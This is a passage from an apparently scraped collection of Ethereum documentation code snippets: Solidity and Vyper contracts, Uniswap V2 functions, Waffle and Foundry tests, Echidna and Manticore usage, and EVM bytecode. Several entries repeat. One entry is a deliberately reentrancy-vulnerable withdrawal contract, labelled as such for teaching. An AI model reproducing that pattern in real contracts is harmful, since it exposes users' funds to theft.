245759936, 245889856, 246021056, 246152512, 246284224,\n246415168, 246545344, 246675904, 246808384, 246939584, 247070144,\n247199552, 247331648, 247463872, 247593536, 247726016, 247857088,\n247987648, 248116928, 248249536, 248380736, 248512064, 248643008,\n248773312, 248901056, 249036608, 249167552, 249298624, 249429184,\n249560512, 249692096, 249822784, 249954112, 250085312, 250215488,\n250345792, 250478528, 250608704, 250739264, 250870976, 251002816,\n251133632, 251263552, 251395136, 251523904, 251657792, 251789248,\n251919424, 252051392, 252182464, 252313408, 252444224, 252575552,\n252706624, 252836032, 252968512, 253099712, 253227584, 253361728,\n253493056, 253623488, 253754432, 253885504, 254017216, 254148032,\n254279488, 254410432, 254541376, 254672576, 254803264, 254933824,\n255065792, 255196736, 255326528, 255458752, 255589952, 255721408,\n255851072, 255983296, 256114624, 256244416, 256374208, 256507712,\n256636096, 256768832, 256900544, 257031616, 257162176, 257294272,\n257424448, 257555776, 257686976, 257818432, 257949632, 258079552,\n258211136, 258342464, 258473408, 258603712, 258734656, 258867008,\n258996544, 259127744, 259260224, 259391296, 259522112, 259651904,\n259784384, 259915328, 260045888, 260175424, 260308544, 260438336,\n260570944, 260700992, 260832448, 260963776, 261092672, 261226304,\n261356864, 261487936, 261619648, 261750592, 261879872, 262011968,\n262143424, 262274752, 262404416, 262537024, 262667968, 262799296,\n262928704, 263061184, 263191744, 263322944, 263454656, 263585216,\n263716672, 263847872, 263978944, 264108608, 264241088, 264371648,\n264501184, 264632768, 264764096, 264895936, 265024576, 265158464,\n265287488, 265418432, 265550528, 265681216, 265813312, 265943488,\n266075968, 266206144, 266337728, 266468032, 266600384, 266731072,\n266862272, 266993344, 267124288, 267255616, 267386432, 267516992,\n267648704, 267777728, 267910592, 268040512, 268172096, 268302784,\n268435264, 268566208, 268696256, 268828096, 268959296, 269090368,\n269221312, 269352256, 269482688, 269614784, 269745856, 269876416,\n270007616, 270139328, 270270272, 270401216, 270531904, 270663616,\n270791744, 270924736, 271056832, 271186112, 271317184, 271449536,\n271580992, 271711936, 271843136, 271973056, 272105408, 272236352,\n272367296, 272498368, 272629568, 272759488, 272891456, 273022784,\n273153856, 273284672, 273415616, 273547072, 273677632, 273808448,\n273937088, 274071488, 274200896, 274332992, 274463296, 274595392,\n274726208, 274857536, 274988992, 275118656, 275250496, 275382208,\n275513024, 275643968, 275775296, 275906368, 276037184, 276167872,\n276297664, 276429376, 276560576, 276692672, 276822976, 276955072,\n277085632, 277216832, 277347008, 277478848, 277609664, 277740992,\n277868608, 278002624, 278134336, 278265536, 278395328, 278526784,\n278657728, 278789824, 278921152, 279052096, 279182912, 279313088,\n279443776, 279576256, 279706048, 279838528, 279969728, 280099648,\n280230976, 280361408, 280493632, 280622528, 280755392, 280887104,\n281018176, 281147968, 281278912, 281411392, 281542592, 281673152,\n281803712, 281935552, 282066496, 282197312, 282329024, 282458816,\n282590272, 282720832, 282853184, 282983744, 283115072, 283246144,\n283377344, 283508416, 283639744, 283770304, 283901504, 284032576,\n284163136, 284294848, 284426176, 284556992, 284687296, 284819264,\n284950208, 285081536\n```\n\n----------------------------------------\n\nTITLE: Storing Token Addresses in Uniswap Pair\nDESCRIPTION: Stores the addresses of the two ERC-20 token contracts that can be exchanged in this liquidity pool.\n\nLANGUAGE: solidity\nCODE:\n```\naddress public token0;\naddress public token1;\n```\n\n----------------------------------------\n\nTITLE: Setting Up State Variables in React Component\nDESCRIPTION: Initializing state variables using useState hook to manage wallet address, status messages, current contract message, and new message input from the user.\n\nLANGUAGE: javascript\nCODE:\n```\n// HelloWorld.js\n\n//State variables\nconst [walletAddress, setWallet] = useState(\"\")\nconst [status, setStatus] = useState(\"\")\nconst [message, setMessage] = useState(\"No connection to the network.\")\nconst [newMessage, setNewMessage] = useState(\"\")\n```\n\n----------------------------------------\n\nTITLE: Setting up Project Directory Structure in Bash\nDESCRIPTION: Commands to create the initial project directory structure for the dynamic mocking example.\n\nLANGUAGE: bash\nCODE:\n```\nmkdir dynamic-mocking\ncd dynamic-mocking\nmkdir contracts src\n\nyarn init\n# or if you're using npm\nnpm init\n```\n\n----------------------------------------\n\nTITLE: Configuring package.json for Waffle Build\nDESCRIPTION: Adding a build script to package.json to compile Solidity contracts using Waffle.\n\nLANGUAGE: json\nCODE:\n```\n\"scripts\": {\n    \"build\": \"waffle\"\n  }\n```\n\n----------------------------------------\n\nTITLE: Setting Up Alchemy Web3 Endpoint for Smart Contract Interaction\nDESCRIPTION: Configures Alchemy Web3 integration by importing the API key from environment variables and setting up the Web3 endpoint for blockchain interaction. Also imports the contract ABI and address for later use.\n\nLANGUAGE: javascript\nCODE:\n```\nrequire(\"dotenv\").config()\nconst alchemyKey = process.env.REACT_APP_ALCHEMY_KEY\nconst { createAlchemyWeb3 } = require(\"@alch/alchemy-web3\")\nconst web3 = createAlchemyWeb3(alchemyKey)\n\nconst contractABI = require(\"../contract-abi.json\")\nconst contractAddress = \"0x4C4a07F737Bf57F6632B6CAB089B78f62385aCaE\"\n```\n\n----------------------------------------\n\nTITLE: Starting Translation Link Button in Markdown\nDESCRIPTION: A ButtonLink component that directs users to the Crowdin project page for ethereum.org translations. This component provides a direct path for volunteers to begin contributing translations.\n\nLANGUAGE: markdown\nCODE:\n```\n<ButtonLink href=\"https://crowdin.com/project/ethereum-org/\">\n  Empezar a traducir\n</ButtonLink>\n```\n\n----------------------------------------\n\nTITLE: Copying the Environment Configuration File\nDESCRIPTION: Command to create a .env file from the example template for configuration settings.\n\nLANGUAGE: shell\nCODE:\n```\ncp .env.example .env\n```\n\n----------------------------------------\n\nTITLE: Implementing Information Banner in JSX\nDESCRIPTION: This code displays an information banner explaining terminology changes in Ethereum, specifically clarifying that 'ETH2' is deprecated in favor of more precise terminology. It explains how the terms were previously used to differentiate between proof-of-work and proof-of-stake networks.\n\nLANGUAGE: jsx\nCODE:\n```\n<InfoBanner mb={8}>\n  <h4 style={{ marginTop: 0 }}>¿Qué era ETH2?</h4>\n\n  <p>El término \"Eth2\" se utilizaba comúnmente para referirse al futuro de Ethereum antes del cambio a <a href=\"/glossary/#pos\">prueba de participación</a>, pero <strong>cayó en desuso en favor de una terminología más precisa.</strong> Originalmente, se usaba para diferenciar la red de Ethereum antes del cambio a la prueba de participación y la red luego de realizarse este cambio, o a veces para referirse a los diferentes clientes de ejecución de Ethereum (los <a href=\"/glossary/#execution-client\">clientes de ejecución</a> a veces se denominaban clientes ETH1 y los <a href=\"/glossary/#consensus-client\">clientes de consenso</a> a veces se denominaban clientes ETH2).</p>\n\n</InfoBanner>\n```\n\n----------------------------------------\n\nTITLE: Running Echidna with Gas Estimation\nDESCRIPTION: Command to run Echidna with a custom configuration file for gas estimation.\n\nLANGUAGE: bash\nCODE:\n```\n$ echidna-test gas.sol --config config.yaml\n...\nechidna_test: passed! 🎉\n\nf used a maximum of 1333608 gas\n  Call sequence:\n    f(42,123,249) Gas price: 0x10d5733f0a Time delay: 0x495e5 Block delay: 0x88b2\n\nUnique instructions: 157\nUnique codehashes: 1\nSeed: -325611019680165325\n\n```\n\n----------------------------------------\n\nTITLE: Testing Long Call Data Handling in Solidity Caching Contract\nDESCRIPTION: Tests the contract's behavior with excessive input parameters, verifying that it correctly handles the first four values and ignores the fifth one without failing.\n\nLANGUAGE: solidity\nCODE:\n```\n    // Test what with an excessively long buffer everything works file\n    function testLongCalldata() public {\n        address _cacheAddr = address(cache);\n        bool _success;\n        bytes memory _callInput;\n        bytes memory _callOutput;\n\n        // First call, the cache is empty\n        _callInput = bytes.concat(\n            FOUR_PARAMS,\n\n            // First value, add it to the cache\n            cache.INTO_CACHE(), bytes32(VAL_A),\n\n            // Second value, add it to the cache\n            cache.INTO_CACHE(), bytes32(VAL_B),\n\n            // Third value, add it to the cache\n            cache.INTO_CACHE(), bytes32(VAL_C),\n\n            // Fourth value, add it to the cache\n            cache.INTO_CACHE(), bytes32(VAL_D),\n\n            // And another value for \"good luck\"\n            bytes4(0x31112233)\n        );\n```\n\n----------------------------------------\n\nTITLE: Implementing a Vulnerable Withdrawal Function in Solidity\nDESCRIPTION: This code demonstrates a vulnerable smart contract that allows users to deposit and withdraw ETH. The withdraw function is susceptible to reentrancy attacks because it performs external calls before updating state variables.\n\nLANGUAGE: solidity\nCODE:\n```\n// This contract is vulnerable. Do not use in production\n\ncontract Victim {\n    mapping (address => uint256) public balances;\n\n    function deposit() external payable {\n        balances[msg.sender] += msg.value;\n    }\n\n    function withdraw() external {\n        uint256 amount = balances[msg.sender];\n        (bool success, ) = msg.sender.call.value(amount)(\"\");\n        require(success);\n        balances[msg.sender] = 0;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Solidity Version for L1 Bridge Contract\nDESCRIPTION: Specifies the Solidity compiler version for the L1StandardBridge contract. The contract uses Solidity 0.8.9 which includes overflow protection and other safety features.\n\nLANGUAGE: solidity\nCODE:\n```\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.9;\n```\n\n----------------------------------------\n\nTITLE: DELEGATECALL Opcode (0xF4) Memory Effect in EVM\nDESCRIPTION: Calls another contract with the same sender and value as the current execution. Copies return data into memory at the specified offset and length.\n\nLANGUAGE: solidity\nCODE:\n```\nmem[retOst:retOst+retLen-1] := returndata\n```\n\n----------------------------------------\n\nTITLE: Implementing a Token Faucet Function in Solidity\nDESCRIPTION: A simple ERC-20 extension function that mints tokens to the caller, useful for testing purposes. This function allows any user to receive 1000 tokens.\n\nLANGUAGE: solidity\nCODE:\n```\n    /**\n     * @dev Gives the caller 1000 tokens to play with\n     */\n    function faucet() external {\n        _mint(msg.sender, 1000);\n    }   // function faucet\n```\n\n----------------------------------------\n\nTITLE: Removing ETH Liquidity with Permit and Fee-on-Transfer Support in Uniswap V2\nDESCRIPTION: Combines permit-based meta-transactions with fee-on-transfer token support. Allows users with fee-on-transfer tokens to remove liquidity without separate approve transactions, improving gas efficiency.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(\n    address token,\n    uint liquidity,\n    uint amountTokenMin,\n    uint amountETHMin,\n    address to,\n    uint deadline,\n    bool approveMax, uint8 v, bytes32 r, bytes32 s\n) external virtual override returns (uint amountETH) {\n    address pair = UniswapV2Library.pairFor(factory, token, WETH);\n    uint value = approveMax ? uint(-1) : liquidity;\n    IUniswapV2Pair(pair).permit(msg.sender, address(this), value, deadline, v, r, s);\n    amountETH = removeLiquidityETHSupportingFeeOnTransferTokens(\n        token, liquidity, amountTokenMin, amountETHMin, to, deadline\n    );\n}\n```\n\n----------------------------------------\n\nTITLE: Testing Wallet Balance Changes with Waffle\nDESCRIPTION: Tests that verify the split function correctly changes the balances of recipient wallets using Waffle's changeBalances and changeBalance matchers.\n\nLANGUAGE: typescript\nCODE:\n```\nit(\"Changes accounts balances\", async () => {\n  await expect(() => splitter.split({ value: 50 })).to.changeBalances(\n    [receiver1, receiver2],\n    [25, 25]\n  )\n})\n\nit(\"Changes account balance\", async () => {\n  await expect(() => splitter.split({ value: 50 })).to.changeBalance(\n    receiver1,\n    25\n  )\n})\n```\n\n----------------------------------------\n\nTITLE: ERC20 Token Contract Bytecode and Opcodes\nDESCRIPTION: This snippet shows the compiled bytecode and corresponding opcodes for an ERC20 token implementation. The bytecode includes error messages for standard ERC20 operations and SafeMath functions to prevent arithmetic overflow.\n\nLANGUAGE: bytecode\nCODE:\n```\n083811015610fab576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252601b8152602001807f536166654d6174683a206164646974696f6e206f766572666c6f77000000000081525060200191505060405180910390fd5b8091505092915050565b50505056fe45524332303a207472616e7366657220746f20746865207a65726f206164647265737345524332303a20617070726f766520746f20746865207a65726f206164647265737345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e636545524332303a207472616e7366657220616d6f756e74206578636565647320616c6c6f77616e636545524332303a207472616e736665722066726f6d20746865207a65726f206164647265737345524332303a20617070726f76652066726f6d20746865207a65726f206164647265737345524332303a2064656372656173656420616c6c6f77616e63652062656c6f77207a65726fa264697066735822122081c840f087cef92feccb03fadc678b2708c331896ec5432b5d4c675f27b6d3e664736f6c63430006020033\n```\n\n----------------------------------------\n\nTITLE: Fallback Function for Custom Calldata Handling\nDESCRIPTION: Fallback function that interprets custom-format calldata to execute token operations. Function code 1 triggers faucet and transfer, while code 2 handles transferFrom operations with compact parameter encoding.\n\nLANGUAGE: solidity\nCODE:\n```\n    fallback() external {\n        uint _func;\n\n        _func = calldataVal(0, 1);\n\n        // Call the state changing methods of token using\n        // information from the calldata\n\n        // faucet\n        if (_func == 1) {\n            token.faucet();\n            token.transfer(msg.sender,\n                token.balanceOf(address(this)));\n        }\n\n        // transfer (assume we have an allowance for it)\n        if (_func == 2) {\n            token.transferFrom(\n                msg.sender,\n                address(uint160(calldataVal(1, 20))),\n                calldataVal(21, 2)\n            );\n        }\n    }   // fallback\n\n}       // contract CalldataInterpreter\n```\n\n----------------------------------------\n\nTITLE: ERC20 Contract Source Map\nDESCRIPTION: Source map for the ERC20 token contract bytecode, providing mappings between the compiled bytecode and the original Solidity source code. This helps with debugging and tracking the relationship between source code and bytecode.\n\nLANGUAGE: ethereum-bytecode\nCODE:\n```\n\"sourceMap\": \"142:152:5:-:0;;;177:115;8:9:-1;5:2;;;30:1;27;20:12;5:2;177:115:5;;;;;;;;;;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;177:115:5;;;;;;;;;;;;;;;;2013:141:2;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;2093:4;2085:5;:12;;;;;;;;;;;;:::i;:::-;;2117:6;2107:7;:16;;;;;;;;;;;;:::i;:::-;;2145:2;2133:9;;:14;;;;;;;;;;;;;;;;;;2013:141;;252:33:5::1;258:10;270:14;252:5;;;:33;;:::i;:::-;177:115:::0;142:152;;7835:370:2;7937:1;7918:21;;:7;:21;;;;7910:65;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;7986:49;8015:1;8019:7;8028:6;7986:20;;;:49;;:::i;:::-;8061:24;8078:6;8061:12;;:16;;;;;;:24;;;;:::i;:::-;8046:12;:39;;;;8116:30;8139:6;8116:9;:18;8126:7;8116:18;;;;;;;;;;;;;;;;:22;;;;;;:30;;;;:::i;:::-;8095:9;:18;8105:7;8095:18;;;;;;;;;;;;;;;:51;;;;8182:7;8161:37;;8178:1;8161:37;;;8191:6;8161:37;;;;;;;;;;;;;;;;;;7835:370;;:::o;10695:92::-;;;;:::o;874:176:1:-;932:7;951:9;967:1;963;:5;951:17;;991:1;986;:6;;978:46;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;1042:1;1035:8;;;874:176;;;;:::o;142:152:5:-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;;;:::o;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;:::o;:::-;;;;;;;;\"\n```\n\n----------------------------------------\n\nTITLE: Implementing Overflow Protection in Solidity Function\nDESCRIPTION: A simple Solidity function example demonstrating overflow protection using require statements to validate that the result of addition is greater than or equal to each of the operands. This pattern helps prove mathematically that the function will never overflow.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction safe_add(uint x, uint y) returns(uint z){\n\n  z = x + y;\n  require(z>=x);\n  require(z>=y);\n\n  return z;\n```\n\n----------------------------------------\n\nTITLE: Fallback Function for Custom Calldata Handling\nDESCRIPTION: Fallback function that interprets custom-format calldata to execute token operations. Function code 1 triggers faucet and transfer, while code 2 handles transferFrom operations with compact parameter encoding.\n\nLANGUAGE: solidity\nCODE:\n```\n    fallback() external {\n        uint _func;\n\n        _func = calldataVal(0, 1);\n\n        // Call the state changing methods of token using\n        // information from the calldata\n\n        // faucet\n        if (_func == 1) {\n            token.faucet();\n            token.transfer(msg.sender,\n                token.balanceOf(address(this)));\n        }\n\n        // transfer (assume we have an allowance for it)\n        if (_func == 2) {\n            token.transferFrom(\n                msg.sender,\n                address(uint160(calldataVal(1, 20))),\n                calldataVal(21, 2)\n            );\n        }\n    }   // fallback\n\n}       // contract CalldataInterpreter\n```\n\n----------------------------------------\n\nTITLE: Importing Token Contract in Calldata Interpreter (Solidity)\nDESCRIPTION: Import statement for the OrisUselessToken contract which is required for token operations in the calldata interpreter.\n\nLANGUAGE: solidity\nCODE:\n```\n//SPDX-License-Identifier: Unlicense\npragma solidity ^0.8.0;\n\n\nimport { OrisUselessToken } from \"./Token.sol\";\n```\n\n----------------------------------------\n\nTITLE: CALLCODE Opcode (0xF2) Memory Effect in EVM\nDESCRIPTION: Similar to DELEGATECALL but does not propagate the original msg.sender and msg.value. Copies return data from the call into memory at the specified offset and length.\n\nLANGUAGE: solidity\nCODE:\n```\nmem[retOst:retOst+retLen-1] = returndata\n```\n\n----------------------------------------\n\nTITLE: Implementing balanceOf and ownerOf ERC-721 functions in Vyper\nDESCRIPTION: View functions that return the token count for an owner and the owner of a specific token. These are core ERC-721 functions for querying ownership information.\n\nLANGUAGE: vyper\nCODE:\n```\n@view\n@external\ndef balanceOf(_owner: address) -> uint256:\n    \"\"\"\n    @dev Returns the number of NFTs owned by `_owner`.\n         Throws if `_owner` is the zero address. NFTs assigned to the zero address are considered invalid.\n    @param _owner Address for whom to query the balance.\n    \"\"\"\n    assert _owner != ZERO_ADDRESS\n    return self.ownerToNFTokenCount[_owner]\n\n@view\n@external\ndef ownerOf(_tokenId: uint256) -> address:\n    \"\"\"\n    @dev Returns the address of the owner of the NFT.\n         Throws if `_tokenId` is not a valid NFT.\n    @param _tokenId The identifier for an NFT.\n    \"\"\"\n    owner: address = self.idToOwner[_tokenId]\n    # Throws if `_tokenId` is not a valid NFT\n    assert owner != ZERO_ADDRESS\n    return owner\n```\n\n----------------------------------------\n\nTITLE: Visualizing Git Branching Strategy for Normal Releases in Ethereum.org\nDESCRIPTION: ASCII diagram showing the Git branch structure for a normal release cycle, illustrating how code flows from feature branches through dev and staging to master.\n\nLANGUAGE: plaintext\nCODE:\n```\nmaster  O (tag) - - - - - - - - - - - - O (tag)\n\n        |                             /\n\nstaging O - - - - - - - - - O - - - O\n\n        |                 /          \\\n\ndev     O - - - - O - - - - O - - O - O\n\n          \\       \\        /      /\n\nfeature1    \\   _  \\ _ _ O     /\n\nfeature 2             \\ _ _  O\n```\n\n----------------------------------------\n\nTITLE: EtherSplitter Smart Contract in Solidity\nDESCRIPTION: A simple Solidity contract that allows splitting Ether evenly between two predefined recipients. The contract requires an even amount of wei and emits Transfer events for each transaction.\n\nLANGUAGE: solidity\nCODE:\n```\npragma solidity ^0.6.0;\n\ncontract EtherSplitter {\n    address payable receiver1;\n    address payable receiver2;\n\n    event Transfer(address from, address to, uint256 amount);\n\n    constructor(address payable _address1, address payable _address2) public {\n        receiver1 = _address1;\n        receiver2 = _address2;\n    }\n\n    function split() public payable {\n        require(msg.value % 2 == 0, 'Uneven wei amount not allowed');\n        receiver1.transfer(msg.value / 2);\n        emit Transfer(msg.sender, receiver1, msg.value / 2);\n        receiver2.transfer(msg.value / 2);\n        emit Transfer(msg.sender, receiver2, msg.value / 2);\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Integer Overflow Protection in Solidity\nDESCRIPTION: This code snippet demonstrates a simple function that safely adds two unsigned integers with overflow protection. It uses require statements to verify that the result is not less than either of the inputs, which would indicate an overflow has occurred.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction safe_add(uint x, uint y) returns(uint z){\n\n  z = x + y;\n  require(z>=x);\n  require(z>=y);\n\n  return z;\n```\n\n----------------------------------------\n\nTITLE: Rendering Roadmap Action Cards in JSX\nDESCRIPTION: This code snippet renders a grid of action cards that describe key improvements in the Ethereum roadmap including scaling, security, user experience, and future-proofing. Each card contains a title, image, description, and a button linking to more detailed information.\n\nLANGUAGE: jsx\nCODE:\n```\n<CardGrid>\n  <RoadmapActionCard\n    href=\"/roadmap/scaling\"\n    title=\"Transacciones más baratas\"\n    image=\"scaling\"\n    description=\"Rollups are too expensive and rely on centralized components, causing users to place too much trust in their operators. The roadmap includes fixes for both of these problems.\"\n    buttonText=\"More on reducing fees\"\n  />\n  <RoadmapActionCard\n    href=\"/roadmap/security\"\n    title=\"Mayor seguridad\"\n    image=\"security\"\n    description=\"Ethereum is already very secure but it can be made even stronger, ready to withstand all kinds of attack far into the future.\"\n    buttonText=\"More on security\"\n  />\n  <RoadmapActionCard\n    href=\"/roadmap/user-experience\"\n    title=\"Mejor experiencia de usuario\"\n    image=\"userExperience\"\n    description=\"More support for smart contract wallets and light-weight nodes will make using Ethereum simpler and safer.\"\n    buttonText=\"More on user experience\"\n  />\n  <RoadmapActionCard\n    href=\"/roadmap/future-proofing\"\n    title=\"Futura prevención de errores\"\n    image=\"futureProofing\"\n    description=\"Ethereum researchers and developers are solving tomorrow's problems today, readying the network for future generations.\"\n    buttonText=\"More on future proofing\"\n  />\n</CardGrid>\n```\n\n----------------------------------------\n\nTITLE: Echidna Gas Estimation Configuration in YAML\nDESCRIPTION: A simple YAML configuration that enables gas estimation in Echidna. This setting allows Echidna to report maximum gas consumption for each function after the fuzzing campaign completes.\n\nLANGUAGE: yaml\nCODE:\n```\nestimateGas: true\n```\n\n----------------------------------------\n\nTITLE: Adding Constraints to Smart Contract Analysis in Manticore\nDESCRIPTION: Demonstrates how to add constraints to your Manticore analysis to restrict the exploration space, using Z3Solver to check constraint feasibility.\n\nLANGUAGE: python\nCODE:\n```\nfrom manticore.ethereum import ManticoreEVM\nfrom manticore.core.smtlib.solver import Z3Solver\n\nsolver = Z3Solver.instance()\n\nm = ManticoreEVM()\n\nwith open(\"example.sol\") as f:\n    source_code = f.read()\n\nuser_account = m.create_account(balance=1000)\ncontract_account = m.solidity_create_contract(source_code, owner=user_account)\n\nsymbolic_var = m.make_symbolic_value()\ncontract_account.f(symbolic_var)\n\nno_bug_found = True\n```\n\n----------------------------------------\n\nTITLE: Calculating Output Amount with Swap Fee in UniswapV2Library\nDESCRIPTION: Function that calculates the output amount of tokens when accounting for the 0.3% swap fee. This provides a more accurate estimate of the actual return from a swap than the quote function.\n\nLANGUAGE: solidity\nCODE:\n```\n    // given an input amount of an asset and pair reserves, returns the maximum output amount of the other asset\n    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) internal pure returns (uint amountOut) {\n        require(amountIn > 0, 'UniswapV2Library: INSUFFICIENT_INPUT_AMOUNT');\n        require(reserveIn > 0 && reserveOut > 0, 'UniswapV2Library: INSUFFICIENT_LIQUIDITY');\n        uint amountInWithFee = amountIn.mul(997);\n        uint numerator = amountInWithFee.mul(reserveOut);\n        uint denominator = reserveIn.mul(1000).add(amountInWithFee);\n        amountOut = numerator / denominator;\n    }\n```\n\n----------------------------------------\n\nTITLE: Importing Test Dependencies in Solidity\nDESCRIPTION: Imports the necessary Foundry test packages and console logging functionality to support unit testing in Solidity.\n\nLANGUAGE: solidity\nCODE:\n```\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.13;\n\nimport \"forge-std/Test.sol\";\n\n\n// Need to run `forge test -vv` for the console.\nimport \"forge-std/console.sol\";\n```\n\n----------------------------------------\n\nTITLE: Ottimizzazione delle variabili nelle funzioni Solidity\nDESCRIPTION: Dimostrazione di come evitare variabili temporanee intermedie possa ridurre le dimensioni del contratto di circa 0,28kb. Accedendo direttamente ai campi di una struct invece di memorizzarla prima in una variabile temporanea, si ottiene un codice più compatto.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction get(uint id) returns (address,address) {\n    MyStruct memory myStruct = myStructs[id];\n    return (myStruct.addr1, myStruct.addr2);\n}\n```\n\nLANGUAGE: solidity\nCODE:\n```\nfunction get(uint id) returns (address,address) {\n    return (myStructs[id].addr1, myStructs[id].addr2);\n}\n```\n\n----------------------------------------\n\nTITLE: Using useEffect to Check Wallet Connection on Component Mount\nDESCRIPTION: This useEffect hook calls getCurrentWalletConnected when the component mounts to check if a wallet is already connected and updates the component state accordingly.\n\nLANGUAGE: javascript\nCODE:\n```\nuseEffect(async () => {\n  const { address, status } = await getCurrentWalletConnected()\n  setWallet(address)\n  setStatus(status)\n}, [])\n```\n\n----------------------------------------\n\nTITLE: Adding Constraints to Smart Contract Analysis in Manticore\nDESCRIPTION: Demonstrates how to add constraints to your Manticore analysis to restrict the exploration space, using Z3Solver to check constraint feasibility.\n\nLANGUAGE: python\nCODE:\n```\nfrom manticore.ethereum import ManticoreEVM\nfrom manticore.core.smtlib.solver import Z3Solver\n\nsolver = Z3Solver.instance()\n\nm = ManticoreEVM()\n\nwith open(\"example.sol\") as f:\n    source_code = f.read()\n\nuser_account = m.create_account(balance=1000)\ncontract_account = m.solidity_create_contract(source_code, owner=user_account)\n\nsymbolic_var = m.make_symbolic_value()\ncontract_account.f(symbolic_var)\n\nno_bug_found = True\n```\n\n----------------------------------------\n\nTITLE: Importing Test Dependencies in Solidity\nDESCRIPTION: Imports the necessary Foundry test packages and console logging functionality to support unit testing in Solidity.\n\nLANGUAGE: solidity\nCODE:\n```\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.13;\n\nimport \"forge-std/Test.sol\";\n\n\n// Need to run `forge test -vv` for the console.\nimport \"forge-std/console.sol\";\n```\n\n----------------------------------------\n\nTITLE: Test de contrat avec bouchonnage dynamique\nDESCRIPTION: Code TypeScript pour tester le contrat AmIRichAlready en utilisant le bouchonnage dynamique pour simuler le comportement du contrat ERC20.\n\nLANGUAGE: typescript\nCODE:\n```\nimport { expect, use } from \"chai\"\nimport { Contract, utils, Wallet } from \"ethers\"\nimport {\n  deployContract,\n  deployMockContract,\n  MockProvider,\n  solidity,\n} from \"ethereum-waffle\"\n\nimport IERC20 from \"../build/IERC20.json\"\nimport AmIRichAlready from \"../build/AmIRichAlready.json\"\n\nuse(solidity)\n\ndescribe(\"Am I Rich Already\", () => {\n  let mockERC20: Contract\n  let contract: Contract\n  let wallet: Wallet\n\n  beforeEach(async () => {\n    ;[wallet] = new MockProvider().getWallets()\n    mockERC20 = await deployMockContract(wallet, IERC20.abi)\n    contract = await deployContract(wallet, AmIRichAlready, [mockERC20.address])\n  })\n})\n```\n\n----------------------------------------\n\nTITLE: Testing Contract Function Calls with Specific Arguments\nDESCRIPTION: Using Waffle's calledOnContractWith matcher to verify that the contract calls functions with specific arguments on its dependencies.\n\nLANGUAGE: typescript\nCODE:\n```\nit(\"checks if contract called balanceOf with certain wallet on the ERC20 token\", async () => {\n  await mockERC20.mock.balanceOf\n    .withArgs(wallet.address)\n    .returns(utils.parseEther(\"999999\"))\n  await contract.check()\n  expect(\"balanceOf\").to.be.calledOnContractWith(mockERC20, [wallet.address])\n})\n```\n\n----------------------------------------\n\nTITLE: Lecture du solde ERC20 avec la méthode balanceOf\nDESCRIPTION: Appel de la fonction balanceOf du contrat DAI pour lire le solde d'une adresse sans modifier l'état de la blockchain.\n\nLANGUAGE: javascript\nCODE:\n```\ndaiToken.methods.balanceOf(senderAddress).call(function (err, res) {\n  if (err) {\n    console.log(\"An error occurred\", err)\n    return\n  }\n  console.log(\"The balance is: \", res)\n})\n```\n\n----------------------------------------\n\nTITLE: EVM Bytecode for Value Retrieval and Initial Processing\nDESCRIPTION: This section retrieves the stored value from storage slot 6 (interpreted as the contract's tracked value) and prepares for processing an incoming ETH transfer.\n\nLANGUAGE: EVM Bytecode\nCODE:\n```\n| Offset | Código de operación | Pila (después del código de operación)                                              |\n| ------:| ------------------- | ----------------------------------------------------------------------------------- |\n|     64 | CALLVALUE           | [Wei](/glossary/#wei) proporcionado por la llamada. Llamado `msg.value` en Solidity |\n|     65 | PUSH1 0x06          | 6 CALLVALUE                                                                         |\n|     67 | PUSH1 0x00          | 0 6 CALLVALUE                                                                       |\n|     69 | DUP3                | CALLVALUE 0 6 CALLVALUE                                                             |\n|     6A | DUP3                | 6 CALLVALUE 0 6 CALLVALUE                                                           |\n|     6B | SLOAD               | Storage[6] CALLVALUE 0 6 CALLVALUE                                                  |\n```\n\n----------------------------------------\n\nTITLE: Test Constants Definition\nDESCRIPTION: Defines constants needed for cache parameter testing, including a function signature and test values that will be used to verify parameter reading functionality.\n\nLANGUAGE: solidity\nCODE:\n```\n    // Function signature for fourParams(), courtesy of\n    // https://www.4byte.directory/signatures/?bytes4_signature=0x3edc1e6d\n    bytes4 constant FOUR_PARAMS = 0x3edc1e6d;\n\n    // Just some constant values to see we're getting the correct values back\n    uint256 constant VAL_A = 0xDEAD60A7;\n    uint256 constant VAL_B =     0xBEEF;\n    uint256 constant VAL_C =     0x600D;\n    uint256 constant VAL_D = 0x600D60A7;\n```\n\n----------------------------------------\n\nTITLE: Testing Insufficient Parameters in Solidity Contract Call\nDESCRIPTION: Tests the contract's behavior when receiving insufficient parameters, expecting the call to fail and return false.\n\nLANGUAGE: solidity\nCODE:\n```\n        .\n        .\n        .\n        (_success, _callOutput) = _cacheAddr.call(_callInput);\n        assertEq(_success, false);\n    }   // testShortCalldata\n```\n\n----------------------------------------\n\nTITLE: Avoiding Struct Parameters in Solidity Functions\nDESCRIPTION: Shows how to optimize contract size by passing individual struct members instead of the entire struct to functions. This approach can save approximately 0.1kb when using ABIEncoderV2.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction get(uint id) returns (address,address) {\n    return _get(myStruct);\n}\n\nfunction _get(MyStruct memory myStruct) private view returns(address,address) {\n    return (myStruct.addr1, myStruct.addr2);\n}\n```\n\nLANGUAGE: solidity\nCODE:\n```\nfunction get(uint id) returns(address,address) {\n    return _get(myStructs[id].addr1, myStructs[id].addr2);\n}\n\nfunction _get(address addr1, address addr2) private view returns(address,address) {\n    return (addr1, 